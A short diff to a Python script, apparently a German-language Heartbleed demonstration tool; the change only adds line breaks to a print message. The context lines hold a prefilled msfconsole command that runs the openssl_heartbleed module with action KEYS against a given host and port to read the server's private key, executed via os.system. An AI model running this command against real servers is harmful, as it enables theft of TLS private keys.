@@ -35,7 +35,7 @@ def StartHeartbleedMetasploit():
 
 
 		# metasploit
-		print("Nun wird ein metasploit Plugin konfiguriert und gestartet, welches versucht, den Private Key des Servers auszulesen.")
+		print("\n\nNun wird ein metasploit Plugin konfiguriert und gestartet, welches versucht, den Private Key des Servers auszulesen.")
 		command = rlinput("# ", "msfconsole -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set action KEYS; set RHOSTS %s; set RPORT %s; set verbose true; exploit; exit;'" % (ip, port))
 		os.system(command)
 
